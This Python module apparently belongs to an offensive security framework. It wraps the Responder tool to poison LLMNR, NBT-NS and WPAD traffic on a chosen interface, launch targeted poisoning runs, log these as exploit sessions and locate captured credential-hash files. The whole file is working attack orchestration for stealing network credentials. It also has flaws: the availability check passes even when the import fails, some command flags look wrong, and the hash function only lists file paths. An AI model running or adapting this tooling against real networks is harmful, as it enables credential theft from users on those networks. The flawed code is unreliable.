"""
Responder service for LLMNR/NBT-NS poisoning and hash capture.
"""
import subprocess
import json
import re
from typing import Dict, Any, Optional, List
from datetime import datetime
import os

from backend import database


class ResponderService:
    """Service class for Responder operations."""
    
    def __init__(self):
        """Initialize the Responder service."""
        self.responder_available = self._check_responder()
        self.responder_path = "Responder"  # Default path
        self.active_process = None
    
    def _check_responder(self) -> bool:
        """Check if Responder is available on the system."""
        # Check common locations
        possible_paths = [
            "/usr/bin/Responder",
            "/usr/local/bin/Responder",
            "/opt/Responder/Responder.py",
            "./Responder/Responder.py"
        ]
        
        for path in possible_paths:
            if os.path.exists(path):
                return True
        
        # Try running responder
        try:
            result = subprocess.run(
                ["responder", "--version"],
                capture_output=True,
                text=True,
                timeout=5
            )
            return result.returncode == 0
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        
        # Check if Python can run it
        try:
            result = subprocess.run(
                ["python3", "-c", "import Responder"],
                capture_output=True,
                text=True,
                timeout=5
            )
            return True
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return False
    
    def is_available(self) -> bool:
        """Check if Responder is available."""
        return self.responder_available
    
    async def start_listener(self, interface: str = "eth0", options: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Start Responder in listen mode."""
        if not self.responder_available:
            return {
                "success": False,
                "error": "Responder is not available on this system"
            }
        
        try:
            # Build command
            cmd = ["responder", "-I", interface, "-w", "-v"]
            
            if options:
                if options.get("analyze_mode"):
                    cmd.extend(["-A"])
                if options.get("no_http"):
                    cmd.append("--nohttp")
                if options.get("no_https"):
                    cmd.append("--nohttps")
                if options.get("no_wredir"):
                    cmd.append("--nowredir")
                if options.get("no_proxy"):
                    cmd.append("--noproxy")
                if options.get("no_sql"):
                    cmd.append("--nosql")
                if options.get("quiet"):
                    cmd.append("-q")
            
            # Start the listener
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            self.active_process = process
            
            # Create a session in database
            session_id = database.create_session(
                target=interface,
                exploit="responder",
                payload="llmnr_poisoning"
            )
            
            return {
                "success": True,
                "session_id": session_id,
                "message": f"Responder started on interface {interface}",
                "interface": interface,
                "pid": process.pid
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": f"Failed to start Responder: {str(e)}"
            }
    
    def stop_listener(self) -> Dict[str, Any]:
        """Stop the Responder listener."""
        if self.active_process:
            try:
                self.active_process.terminate()
                self.active_process.wait(timeout=5)
                return {
                    "success": True,
                    "message": "Responder stopped"
                }
            except Exception as e:
                return {
                    "success": False,
                    "error": f"Failed to stop Responder: {str(e)}"
                }
        else:
            return {
                "success": False,
                "error": "No active Responder process"
            }
    
    def get_hashes(self) -> Dict[str, Any]:
        """Get captured hashes from Responder."""
        try:
            # Common location for Responder logs
            log_paths = [
                "/usr/share/responder/logs/",
                "/opt/Responder/logs/",
                "./Responder/logs/",
                "/tmp/responder/logs/"
            ]
            
            hashes = []
            
            for log_path in log_paths:
                if os.path.exists(log_path):
                    # Look for database files
                    for filename in ["responder.db", "SQLite.db", "NBT-NS.dat"]:
                        db_path = os.path.join(log_path, filename)
                        if os.path.exists(db_path):
                            hashes.append({
                                "source": db_path,
                                "type": filename
                            })
            
            # If no database, check for text logs
            if not hashes:
                return {
                    "success": True,
                    "message": "No hash databases found",
                    "hashes": []
                }
            
            return {
                "success": True,
                "hashes": hashes
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def poison_target(self, target: str, options: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Poison a specific target (single target mode)."""
        if not self.responder_available:
            return {
                "success": False,
                "error": "Responder is not available on this system"
            }
        
        try:
            cmd = ["responder", "-I", options.get("interface", "eth0") if options else "eth0"]
            
            if options:
                if options.get("router"):
                    cmd.extend(["-r", "1"])
                if options.get("wpad"):
                    cmd.extend(["-w", "1"])
            
            cmd.extend(["--lp", options.get("listen_port", "5050") if options else "5050"])
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            return {
                "success": True,
                "message": "Poison attack initiated",
                "output": result.stdout[:1000]
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    def get_options(self) -> Dict[str, Any]:
        """Get available options for Responder."""
        if not self.responder_available:
            return {
                "success": False,
                "error": "Responder is not available"
            }
        
        return {
            "success": True,
            "options": {
                "interfaces": ["eth0", "wlan0", "wlan1", "tap0"],
                "modes": {
                    "analyze": "Analyze mode - doesn't poison requests",
                    "poison": "Full poisoning mode (default)"
                },
                "services": {
                    "http": "HTTP service (enabled by default)",
                    "https": "HTTPS service (enabled by default)",
                    "smb": "SMB service (enabled by default)",
                    "ldap": "LDAP service (enabled by default)",
                    "dns": "DNS service (enabled by default)",
                    "wredir": "Windows Redirection (enabled by default)",
                    "proxy": "WPAD Proxy (enabled by default)",
                    "sql": "SQL Server (enabled by default)",
                    "ftp": "FTP service (enabled by default)",
                    "pop": "POP3 service (enabled by default)",
                    "smtp": "SMTP service (enabled by default)",
                    "imap": "IMAP service (enabled by default)",
                    "nbtns": "NBT-NS service (enabled by default)",
                    "llmnr": "LLMNR service (enabled by default)"
                }
            }
        }
    
    def get_status(self) -> Dict[str, Any]:
        """Get current Responder status."""
        return {
            "success": True,
            "running": self.active_process is not None,
            "pid": self.active_process.pid if self.active_process else None,
            "available": self.responder_available
        }
    
    async def analyze_network(self, interface: str = "eth0") -> Dict[str, Any]:
        """Run Responder in analyze mode to see traffic without poisoning."""
        if not self.responder_available:
            return {
                "success": False,
                "error": "Responder is not available"
            }
        
        try:
            cmd = ["responder", "-I", interface, "-A", "-v"]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            # Parse output for detected services
            analysis = {
                "llmnr_queries": 0,
                "nbns_queries": 0,
                "mdns_queries": 0,
                "dns_queries": 0,
                "services": []
            }
            
            for line in result.stdout.split('\n'):
                if "LLMNR" in line:
                    analysis["llmnr_queries"] += 1
                if "NBT-NS" in line:
                    analysis["nbns_queries"] += 1
                if "mDNS" in line:
                    analysis["mdns_queries"] += 1
                if "DNS" in line:
                    analysis["dns_queries"] += 1
            
            return {
                "success": True,
                "analysis": analysis,
                "raw_output": result.stdout[:5000]
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }


# Singleton instance
responder_service = ResponderService()
